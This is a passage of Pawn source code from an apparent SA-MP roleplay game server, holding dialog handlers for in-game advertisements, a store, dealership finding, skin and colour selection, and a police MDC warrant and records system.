 				format(szMessage, sizeof(szMessage), "Advertisement: %s - contact %s (%i)", inputtext, GetPlayerNameEx(playerid), PlayerInfo[playerid][pNumber]);
				SendClientMessageToAllEx(TEAM_GROVE_COLOR, szMessage);

				return SendClientMessage(playerid, COLOR_WHITE, "Congratulations, you've placed your priority advertisement!");
			}
			else ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Advertisements", "List Advertisements\nSearch Advertisements\nPlace Advertisement\nPlace Priority Advertisement", "Select", "Cancel");
		}
		case DIALOG_ADSEARCH: {
			if(response) {

				if(!(4 <= strlen(inputtext) <= 80))
					return ShowPlayerDialogEx(playerid, DIALOG_ADSEARCH, DIALOG_STYLE_INPUT, "Advertisements - Search", "Queries must be between 4\n and 80 characters in length.\n\nEnter a search phrase.", "Search", "Return");
				else for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;

				new
					szDialog[2256],
					szSearch[80],
					szBuffer[32],
					iCount;

				strcat(szSearch, inputtext, sizeof(szSearch)); // strfind is a piece of shit when it comes to non-indexed arrays, maybe this'll help.
				foreach(Player, i) if(!isnull(szAdvert[i])) {
					// printf("[ads] [NAME: %s] [ID: %i] [AD: %s] [SEARCH: %s]", GetPlayerNameEx(i), i, szAdvert[i], szSearch);
					if(strfind(szAdvert[i], szSearch, true) != -1 && iCount < 50) {
						// printf("[ads - MATCH] [NAME: %s] [ID: %i] [AD: %s] [SEARCH: %s] [COUNT: %i] [DIALOG LENGTH: %i] [FINDPOS: %i]", GetPlayerNameEx(i), i, szAdvert[i], szSearch, iCount, strlen(szDialog), strfind(szAdvert[i], szSearch, true));
						strcpy(szBuffer, szAdvert[i], sizeof(szBuffer));
						if(AdminDuty[playerid] == 0) format(szDialog, sizeof(szDialog), "%s%s... (%i)\r\n", szDialog, szBuffer, PlayerInfo[i][pNumber]);
						else format(szDialog, sizeof(szDialog), "%s%s... (%s)\r\n", szDialog, szBuffer, GetPlayerNameEx(i));
						ListItemTrackId[playerid][iCount++] = i;
					}
				}
				if(!isnull(szDialog)) ShowPlayerDialogEx(playerid, DIALOG_ADSEARCHLIST, DIALOG_STYLE_LIST, "Advertisements - Search Results", szDialog, "Select", "Return");
				else ShowPlayerDialogEx(playerid, DIALOG_ADSEARCHLIST, DIALOG_STYLE_INPUT, "Advertisements - Search", "No results found.\n\nEnter a search phrase.", "Search", "Return");

			}
			else ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Advertisements", "List Advertisements\nSearch Advertisements\nPlace Advertisement\nPlace Priority Advertisement", "Select", "Cancel");
		}
		case DIALOG_ADSEARCHLIST: if(response) {

			new
				i = ListItemTrackId[playerid][listitem],
				szDialog[164];

			if(IsPlayerConnected(i) && !isnull(szAdvert[i])) {
				format(szDialog, sizeof(szDialog), "%s\r\nContact: %i", szAdvert[i], PlayerInfo[i][pNumber]);
				ShowPlayerDialogEx(playerid, DIALOG_ADFINAL, DIALOG_STYLE_MSGBOX, "Advertisements - Search Result", szDialog, "Return", "Exit");
			}
			else SendClientMessage(playerid, COLOR_GREY, "This player has either disconnected or withdrawn their advertisement.");
		}
		case DIALOG_ADFINAL: {
			if(response) return ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Advertisements", "List Advertisements\nSearch Advertisements\nPlace Advertisement\nPlace Priority Advertisement", "Select", "Cancel");
		}
		case DIALOG_ADLIST: {
			if(response) {

				new
					i = ListItemTrackId[playerid][listitem],
					szDialog[164];

				if(IsPlayerConnected(i) && !isnull(szAdvert[i])) {
					format(szDialog, sizeof(szDialog), "%s\r\nContact: %i", szAdvert[i], PlayerInfo[i][pNumber]);
					return ShowPlayerDialogEx(playerid, DIALOG_ADFINAL, DIALOG_STYLE_MSGBOX, "Advertisements - Search Result", szDialog, "Return", "Exit");
				}
				else SendClientMessage(playerid, COLOR_GREY, "This player has either disconnected or withdrawn their advertisement.");
			}
			else ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Advertisements", "List Advertisements\nSearch Advertisements\nPlace Advertisement\nPlace Priority Advertisement", "Select", "Cancel");
		}
	}
	if(dialogid == STOREMENU)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(GetPlayerCash(playerid) >= 50)
				{
					new randphone = 1000 + random(99999);//minimum 1000  max 99999
					ReplacePH(PlayerInfo[playerid][pNumber], randphone);
					PlayerInfo[playerid][pNumber] = randphone;
 					PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
					PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
					GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
					GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
					GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
					OnPlayerStatsUpdate(playerid);
					format(string, sizeof(string), "Cellphone purchased, your new phone number is %d.", randphone);
					SendClientMessage(playerid, COLOR_GRAD4, string);
					SendClientMessage(playerid, COLOR_GRAD5, "You can check this any time you wish by typing /stats.");
					SendClientMessage(playerid, COLOR_WHITE, "HINT: You can now type /cellphonehelp to see your cellphone commands.");
					GivePlayerCash(playerid, -50);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "You don't have the cash for this item!");
				}
			}
			if(listitem == 1)
			{
				if(GetPlayerCash(playerid) >= 25)
				{
					PlayerInfo[playerid][pPhoneBook] = 1;
					format(string, sizeof(string), "Phonebook purchased, you can now look up other player's numbers.");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					SendClientMessage(playerid, COLOR_WHITE, "HINT: Type /number <id/name>.");
					GivePlayerCash(playerid, -25);
				}
				else
				{
				SendClientMessage(playerid, COLOR_GRAD4, "You don't have the cash for this item!");
				}
			}
			if(listitem == 2)
			{
				if(GetPlayerCash(playerid) >= 50)
				{
					PlayerInfo[playerid][pDice] = 1;
					format(string, sizeof(string), "Dice purchased.");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					SendClientMessage(playerid, COLOR_WHITE, "HINT: Type /dice.");
					GivePlayerCash(playerid, -50);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "You don't have the cash for this item!");
				}
			}
			if(listitem == 3)
			{
				if(GetPlayerCash(playerid) >= 5)
				{
					Condom[playerid] ++;
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					format(string, sizeof(string), "Condom Purchased.");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					GivePlayerCash(playerid, -5);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "You don't have the cash for this item!");
				}
			}
			if(listitem == 4)
			{
				if(GetPlayerCash(playerid) >= 5)
				{
					GivePlayerCash(playerid, -50);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					SendClientMessage(playerid, COLOR_GRAD4, "CD Player purchased.");
					SendClientMessage(playerid, COLOR_WHITE, "HINT: Type /music");
					PlayerInfo[playerid][pCDPlayer] = 1;
					GivePlayerCash(playerid, -5);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "You don't have the cash for this item!");
				}
			}
			if(listitem == 5)
			{
				if(GetPlayerCash(playerid) >= 20)
				{
					if(PlayerInfo[playerid][pSpraycan] < 20) {
						PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
						PlayerInfo[playerid][pSpraycan] += 10;
						SendClientMessage(playerid, COLOR_GRAD4, "10 Spraycans purchased.");
						SendClientMessage(playerid, COLOR_WHITE, "HINT: Type /colorcar or /paintcar while inside a vehicle.");
						GivePlayerCash(playerid, -20);
					}
					else SendClientMessage(playerid, COLOR_GRAD4, "You can't hold any more of this item!");
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "You don't have the cash for this item!");
				}
			}
			if(listitem == 6)
			{
				if(GetPlayerCash(playerid) >= 100)
				{
					if(PlayerInfo[playerid][pRope] < 8) {
						PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
						PlayerInfo[playerid][pRope] += 3;
						SendClientMessage(playerid, COLOR_GRAD4, "3 Ropes purchased.");
						SendClientMessage(playerid, COLOR_WHITE, "HINT: Type /tie while driving a car to tie someone.");
						GivePlayerCash(playerid, -100);
					}
					else SendClientMessage(playerid, COLOR_GRAD4, "You can't hold any more of this item!");
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "You don't have the cash for this item!");
				}
			}
			if(listitem == 7)
			{
				if(GetPlayerCash(playerid) >= 5)
				{
				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pCigar] = 10;
					SendClientMessage(playerid, COLOR_GRAD4, "10 cigars purchased.");
					SendClientMessage(playerid, COLOR_WHITE, "HINT: Type /usecigar to use your cigars. Left mouse button to smoke it, F to throw it away.");
					GivePlayerCash(playerid, -5);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "You don't have the cash for this item!");
				}
			}
			if(listitem == 8) {
				if(GetPlayerCash(playerid) >= 1) {
				    if(PlayerInfo[playerid][pSprunk] >= 10)
				        return SendClientMessage(playerid, COLOR_GREY, "You can't carry any more Sprunk.");

				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pSprunk] += 1;
					SendClientMessage(playerid, COLOR_GRAD4, "Sprunk purchased.");
					SendClientMessage(playerid, COLOR_WHITE, "HINT: Type /usesprunk to drink a can of Sprunk. Left mouse button to take a sip, F to throw it away.");
					GivePlayerCash(playerid, -1);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "You don't have the cash for this item!");
				}
			}
			if(listitem == 9)
			{
				if(GetPlayerCash(playerid) >= 500)
				{
				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pRadio] = 1;
					PlayerInfo[playerid][pRadioFreq] = 1;
					SendClientMessage(playerid, COLOR_GRAD4, "Portable radio purchased.");
					SendClientMessage(playerid, COLOR_WHITE, "HINT: Type /pr to talk over your portable radio.");
					SendClientMessage(playerid, COLOR_WHITE, "HINT: Type /setfreq to set the frequency of your portable radio.");
					GivePlayerCash(playerid, -500);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "You don't have the cash for this item!");
				}
			}
			if(listitem == 10)
			{
				if(GetPlayerCash(playerid) >= 20)
				{
				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					GivePlayerValidWeapon(playerid, 43, 99999);
					SendClientMessage(playerid, COLOR_GRAD4, "Camera purchased.");
					SendClientMessage(playerid, COLOR_WHITE, "HINT: Remember look into the viewfinder and take a picture.");
					GivePlayerCash(playerid, -20);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "You don't have the cash for this item!");
				}
			}
		}
	}
	if(dialogid == FINDDEALERSHIPMENU)
	{
		if(response)
		{
			new
				szMessage[128];
			SetPlayerCheckpoint(playerid, CarDealershipInfo[listitem][cdEntranceX], CarDealershipInfo[listitem][cdEntranceY], CarDealershipInfo[listitem][cdEntranceZ], 3);
			format(szMessage, sizeof(szMessage), "You have selected %s. Go to the red checkpoint on your radar/map.", CarDealershipInfo[listitem][cdMessage]);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
			FindingDealership[playerid] = 1;
		}
	}
	if(dialogid == FINDCARTUNINGMENU)
	{
		if(response) {
			switch(listitem) {
				case 0: {
					SetPlayerCheckpoint(playerid, -1935.7700, 228.7900, 34.1563, 3);
					SendClientMessage(playerid, COLOR_WHITE, "You have selected TransFender in San Fierro. Go to the red checkpoint on your radar/map.");
					FindingDealership[playerid] = 1; // Using this because it's pointless to make another variable.
				} case 1: {
					SetPlayerCheckpoint(playerid, -2707.4482, 218.9819, 4.1797, 3);
					SendClientMessage(playerid, COLOR_WHITE, "You have selected Wheel Arch Angels in San Fierro. Go to the red checkpoint on your radar/map.");
					FindingDealership[playerid] = 1; // Using this because it's pointless to make another variable.
				} case 2: {
					SetPlayerCheckpoint(playerid, 2645.6418, -2028.8173, 13.5469, 3);
					SendClientMessage(playerid, COLOR_WHITE, "You have selected LowRider Tuning Garage in Los Santos. Go to the red checkpoint on your radar/map.");
					FindingDealership[playerid] = 1; // Using this because it's pointless to make another variable.
				} case 3: {
					SetPlayerCheckpoint(playerid, 1041.2914, -1036.4375, 31.7365, 3);
					SendClientMessage(playerid, COLOR_WHITE, "You have selected TransFender in Los Santos. Go to the red checkpoint on your radar/map.");
					FindingDealership[playerid] = 1; // Using this because it's pointless to make another variable.
				} case 4: {
					SetPlayerCheckpoint(playerid, 2387.5823, 1036.0345, 10.8203, 3);
					SendClientMessage(playerid, COLOR_WHITE, "You have selected TransFender in Las Venturas. Go to the red checkpoint on your radar/map.");
					FindingDealership[playerid] = 1; // Using this because it's pointless to make another variable.
				}
			}
		}
	}
	if(dialogid == COLORMENU)
	{
		if(response)
		{
			if(listitem == 0)
			{
				SetPlayerColor(playerid,COLOR_DBLUE);
				SendClientMessage(playerid, COLOR_DBLUE, "Your color has been set to Blue!");
			}
			if(listitem == 1)
			{
				SetPlayerColor(playerid,COLOR_BLACK);
				SendClientMessage(playerid, COLOR_BLACK, "Your color has been set to Black!");
			}
			if(listitem == 2)
			{
				SetPlayerColor(playerid,COLOR_RED);
				SendClientMessage(playerid, COLOR_RED, "Your color has been set to Red!");
			}
			if(listitem == 3)
			{
				SetPlayerColor(playerid,TEAM_ORANGE_COLOR);
				SendClientMessage(playerid, TEAM_ORANGE_COLOR, "Your color has been set to Orange!");
			}
			if(listitem == 4)
			{
				SetPlayerColor(playerid,COLOR_PINK);
				SendClientMessage(playerid, COLOR_PINK, "Your color has been set to Pink!");
			}
			if(listitem == 5)
			{
				SetPlayerColor(playerid,COLOR_PURPLE);
				SendClientMessage(playerid, COLOR_PURPLE, "Your color has been set to Purple!");
			}
			if(listitem == 6)
			{
				SetPlayerColor(playerid,COLOR_GREEN);
				SendClientMessage(playerid, COLOR_GREEN, "Your color has been set to Green!");
			}
			if(listitem == 7)
			{
				SetPlayerColor(playerid,COLOR_YELLOW);
				SendClientMessage(playerid, COLOR_YELLOW, "Your color has been set to Yellow!");
			}
			if(listitem == 8)
			{
				SetPlayerColor(playerid,COLOR_WHITE);
				SendClientMessage(playerid, COLOR_WHITE, "Your color has been set to White!");
			}
		}
	}
	if(dialogid == 3495) {
		new skinid = strval(inputtext);

		if(!response)
		    return 1;

        if(IsValidSkin(skinid) == 0 && PlayerInfo[playerid][pVip] < 1) {
			SendClientMessage(playerid, COLOR_GREY, "That skin ID is either invalid or restricted to faction or family!");
   			ShowPlayerDialogEx(playerid, 3495, DIALOG_STYLE_INPUT, "Skin Selection","Please enter a Skin ID!\n\nNote: Skin Changes cost $250.", "Buy", "Cancel");
		} else {
			if(GetPlayerCash(playerid) < 250 && PlayerInfo[playerid][pFaction] == 0 && PlayerInfo[playerid][pLeader] == 0)
			   	return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford these clothes!");

			if(PlayerInfo[playerid][pVip] > 0 && IsInvalidSkin(skinid)) {
			    ShowPlayerDialogEx(playerid, 3495, DIALOG_STYLE_INPUT, "Skin Selection","Please enter a Skin ID!\n\nNote: Skin Changes are free for VIP.", "Buy", "Cancel");
			    return SendClientMessage(playerid, COLOR_GREY, "Invalid skin ID, try again.");
			}

			if(PlayerInfo[playerid][pFaction] == 0 && PlayerInfo[playerid][pLeader] == 0 && PlayerInfo[playerid][pVip] == 0) {
				GivePlayerCash(playerid, -250);
				GameTextForPlayer(playerid, "~g~Skin purchased! ~n~ ~r~- $250", 2000, 1);
			} else {
			    GameTextForPlayer(playerid, "~g~Skin changed!", 2000, 1);
			}

			PlayerInfo[playerid][pSkin] = skinid;
			SetPlayerSkin(playerid, skinid);
  		}
		return 1;
	}
	// MDC System
	if(dialogid == MDC_MAIN && response)
	{//*Find LEO\n*Civilian Information\n*Law Enforcement Agencies\n*Options
 		if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");
	   	switch(listitem)
	    {
	        case 0:
	        {
	            ShowPlayerDialogEx(playerid, MDC_FIND, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | LEO GPS Location", "Enter the Law Enforcment Official's Name or ID No.", "Enter", "Cancel");
	        }
	        case 1:
	        {
	            ShowPlayerDialogEx(playerid, MDC_CIVILIANS, DIALOG_STYLE_LIST, "SA-MDC - Logged in | Civilian Options", "*Check Record\n*Licenses\n*Warrants\n*Issue Warrant\n*BOLO\n*Create BOLO\n*Delete", "OK", "Cancel");
	        }
	        case 2:
	        {
	            ShowPlayerDialogEx(playerid, MDC_MEMBERS, DIALOG_STYLE_LIST, "SA-MDC - Logged in | Agency List", "*LSPD\n*FBI\n*LSFMD\n*GOV", "OK", "Cancel");
	        }
		}
	}
	if(dialogid == MDC_FIND && response)
	{
	    new giveplayerid;
		if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");
		if(sscanf(inputtext, "u", giveplayerid))
		{
			ShowPlayerDialogEx(playerid, MDC_FIND, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | LEO GPS Location", "Enter the Law Enforcment Official's Name or ID No.", "Enter", "Cancel");
			return 1;
		}

		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(giveplayerid == playerid)
				{
				    ShowPlayerDialogEx(playerid, MDC_FIND, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: You can't find yourself.\nEnter the Law Enforcment Official's Name or ID No.", "Enter", "Cancel");

					return 1;
				}
				if(PlayerInfo[giveplayerid][pFaction] == 1|| PlayerInfo[giveplayerid][pLeader] == 1 || PlayerInfo[giveplayerid][pFaction] == 2 || PlayerInfo[giveplayerid][pLeader] == 2)
				{
				    if(AdminDuty[giveplayerid] != 0)
				        return SendClientMessage(playerid, COLOR_GREY, "You can't search for on-duty admins.");

	    			SetPlayerMarkerForPlayer(playerid,giveplayerid,FIND_COLOR);
                    FindingPlayer[playerid] = giveplayerid;
		    		FindTime[playerid] = 1;
		    		FindTimePoints[playerid] = 30;
		    	}
		    	else
		    	{
			    	SendClientMessage(playerid, COLOR_GRAD2, " You can only find other cops!");
		    	}
			}
		}
	}
	if(dialogid == MDC_CIVILIANS && response)
	{ //*Check Record\n*Licenses\nWarrants\n*Issue Warrant
		new WarrantString[512];
	 	if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");
		if(News[hTaken6] == 1)
		{
			format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd6], News[hContact6]);
			strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(News[hTaken7] == 1)
		{
			format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd7], News[hContact7]);
			strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(News[hTaken8] == 1)
		{
			format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd8], News[hContact8]);
		    strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(News[hTaken9] == 1)
		{
			format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd9], News[hContact9]);
			strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(News[hTaken10] == 1)
		{
			format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd10], News[hContact10]);
			strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(News[hTaken11] == 1)
		{
			format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd11], News[hContact11]);
			strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(News[hTaken12] == 1)
		{
			format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd12], News[hContact12]);
			strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(News[hTaken13] == 1)
		{
			format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd13], News[hContact13]);
			strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(strlen(WarrantString) == 0)
		{
		    strcat(WarrantString, "No Warrants at this time.", sizeof(WarrantString));
		}
		switch(listitem)
		{
		    case 0: ShowPlayerDialogEx(playerid, MDC_CHECK, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | Records Check", "Enter the Person's Name or ID No.", "Enter", "Cancel");
		    case 1: ShowPlayerDialogEx(playerid, MDC_LICENSES, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | License Check", "Enter the Person's Name or ID No.", "Enter", "Cancel");
			case 2: ShowPlayerDialogEx(playerid, MDC_WARRANTS, DIALOG_STYLE_LIST, "SA-MDC - Logged in | Warrant List", WarrantString, "Enter", "Cancel");
			case 3: ShowPlayerDialogEx(playerid, MDC_ISSUE_SLOT, DIALOG_STYLE_LIST, "SA-MDC - Logged in | Which Slot would you like to use?", "1\n2\n3\n4\n5\n6\n7\n8", "Enter", "Cancel");
		    case 4:
		    {
				new BOLOString[512];
				if(News[hTaken14] == 1)
				{
					format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd14], News[hContact14]);
					strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(News[hTaken15] == 1)
				{
					format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd15], News[hContact15]);
					strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(News[hTaken16] == 1)
				{
					format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd16], News[hContact16]);
				    strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(News[hTaken17] == 1)
				{
					format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd17], News[hContact17]);
					strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(News[hTaken18] == 1)
				{
					format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd18], News[hContact18]);
					strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(News[hTaken19] == 1)
				{
					format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd19], News[hContact19]);
					strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(News[hTaken20] == 1)
				{
					format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd20], News[hContact20]);
					strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(News[hTaken21] == 1)
				{
					format(string, sizeof(string), "%s :: Officer: %s\n", News[hAdd21], News[hContact21]);
					strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(strlen(BOLOString) == 0)
				{
				    strcat(BOLOString, "No BOLOs at this time.", sizeof(BOLOString));
				}
				ShowPlayerDialogEx(playerid, MDC_BOLOLIST, DIALOG_STYLE_LIST, "SA-MDC - Logged In | BOLO List", BOLOString, "OK", "Cancel");
		    }
		    case 5:
		    {
		    	ShowPlayerDialogEx(playerid, MDC_BOLO_SLOT, DIALOG_STYLE_LIST, "SA-MDC - Logged in | Which Slot would you like to use?", "1\n2\n3\n4\n5\n6\n7\n8", "Enter", "Cancel");
		    }
		    case 6:
	        {
	        	ShowPlayerDialogEx(playerid, MDC_DELETE, DIALOG_STYLE_LIST, "SA-MDC - Logged In | Delete", "*BOLO\n*Warrant", "OK", "Cancel");
	        }
		}

	}
	if(dialogid == MDC_MEMBERS && response)
	{
	    if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");
		new MemberString[1024], giveplayer[MAX_PLAYER_NAME];
		new rank[64], division[64], employer[64];
		if(listitem == 0)
		{
			foreach(Player, i)
			{
			    giveplayer = GetPlayerNameEx(i);
				if(PlayerInfo[i][pFaction] == 1)
				{
				    GetPlayerFactionInfo(i, rank, division, employer);
					//GetPlayerName(i, giveplayer, sizeof(giveplayer));
					format(string, sizeof(string), "* %s (%s) %s Ph: %d\n", rank, division,  giveplayer, PlayerInfo[i][pNumber]);
					strcat(MemberString, string, sizeof(MemberString));
				}
			}
			if(strlen(MemberString) == 0)
			{
			    strcat(MemberString, "No Members online at this time.", sizeof(MemberString));
			}
			ShowPlayerDialogEx(playerid, MDC_LSPD, DIALOG_STYLE_LIST, "SA-MDC - Logged in | LSPD Members", MemberString, "Select", "Cancel");
		}
		else if(listitem == 1)
		{
			foreach(Player, i)
			{
			    giveplayer = GetPlayerNameEx(i);
			    if(PlayerInfo[i][pFaction] == 2)
				{
				    GetPlayerFactionInfo(i, rank, division, employer);
					//GetPlayerName(i, giveplayer, sizeof(giveplayer));
					format(string, sizeof(string), "* %s (%s) %s Ph: %d\n", rank, division,  giveplayer, PlayerInfo[i][pNumber]);
					strcat(MemberString, string, sizeof(MemberString));
				}
			}
			if(strlen(MemberString) == 0)
			{
			    strcat(MemberString, "No Members online at this time.", sizeof(MemberString));
			}
			ShowPlayerDialogEx(playerid, MDC_SFPD, DIALOG_STYLE_LIST, "SA-MDC - Logged in | FBI Members", MemberString, "Select", "Cancel");
		}
		else if(listitem == 2)
		{
			foreach(Player, i)
			{
			    giveplayer = GetPlayerNameEx(i);
      	 		if(PlayerInfo[i][pFaction] == 3)
				{
				    GetPlayerFactionInfo(i, rank, division, employer);
					//GetPlayerName(i, giveplayer, sizeof(giveplayer));
					format(string, sizeof(string), "* %s (%s) %s Ph: %d\n", rank, division,  giveplayer, PlayerInfo[i][pNumber]);
					strcat(MemberString, string, sizeof(MemberString));
				}
			}
			if(strlen(MemberString) == 0)
			{
			    strcat(MemberString, "No Members online at this time.", sizeof(MemberString));
			}
			ShowPlayerDialogEx(playerid, MDC_LSFMD, DIALOG_STYLE_LIST, "SA-MDC - Logged in | LSFMD Members", MemberString, "Select", "Cancel");
		}
		else if(listitem == 3)
		{
			foreach(Player, i)
			{
			    giveplayer = GetPlayerNameEx(i);
      	 		if(PlayerInfo[i][pFaction] == 5)
				{
				    GetPlayerFactionInfo(i, rank, division, employer);
					//GetPlayerName(i, giveplayer, sizeof(giveplayer));
					format(string, sizeof(string), "* %s (%s) %s Ph: %d\n", rank, division,  giveplayer, PlayerInfo[i][pNumber]);
					strcat(MemberString, string, sizeof(MemberString));
				}
			}
			if(strlen(MemberString) == 0)
			{
			    strcat(MemberString, "No Members online at this time.", sizeof(MemberString));
			}
			ShowPlayerDialogEx(playerid, MDC_LSFMD, DIALOG_STYLE_LIST, "SA-MDC - Logged in | GOV Members", MemberString, "Select", "Cancel");
		}
	}
	if(dialogid == MDC_WARRANTS && response)
	{
	    if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");
	    ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Warrants", inputtext, "OK", "Back");
	}
	if(dialogid == MDC_BOLOLIST && response)
	{
	    if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");
	    ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | BOLO Hot Sheet", inputtext, "OK", "Back");
	}
	if(dialogid == MDC_CHECK && response)
	{
	    if(!IsMDCPermitted(playerid))
			return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");

		new
			giveplayerid = ReturnUser(inputtext),
			szMessage[128],
			szQuery[256];

		if(giveplayerid != INVALID_PLAYER_ID) {
			format(szMessage, sizeof(szMessage), "** DISPATCH: %s has run a check for warrants on %s **", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			SendRadioMessage(1, COLOR_DBLUE, szMessage);
			SendRadioMessage(2, COLOR_DBLUE, szMessage);
			if(PlayerInfo[giveplayerid][pWantedLevel] == 0) {
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | ERROR ", "There is no record of that person.", "OK", "Cancel");
			} else {
				mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT crimes.* FROM crimes INNER JOIN players ON crimes.crimeIssuedTo = players.ID OR crimes.crimeIssuedTo = players.ID WHERE players.ID = '%d' ORDER BY crimes.crimeID DESC LIMIT %d", PlayerInfo[giveplayerid][pID], PlayerInfo[giveplayerid][pWantedLevel]);
				mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_MDC_CHECK,playerid);
				SetPVarInt(playerid, "MDCCHECK", giveplayerid);
			}
			return 1;
		} else return ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | ERROR ", "There is no record of that person.", "OK", "Cancel");
	}
	if(dialogid == MDC_LICENSES && response)
	{
		if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");
		new giveplayerid;
		if(sscanf(inputtext, "u", giveplayerid))
		{
			ShowPlayerDialogEx(playerid, MDC_LICENSES, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | License Check", "Enter the Person's Name or ID No.", "Enter", "Cancel");
			return 1;
		}
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
			    new LicenseString[256], giveplayer[MAX_PLAYER_NAME];
				GetPlayerName(playerid, sendername, sizeof(sendername));
				GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				new text1[20];
				new text2[20];
				new text4[20];
				if(PlayerInfo[giveplayerid][pCarLic] == 0) { text1 = "Not Passed"; }
				if(PlayerInfo[giveplayerid][pCarLic] == 1) { text1 = "Passed"; }
				if(PlayerInfo[giveplayerid][pCarLic] == 2) { text1 = "Suspended"; }
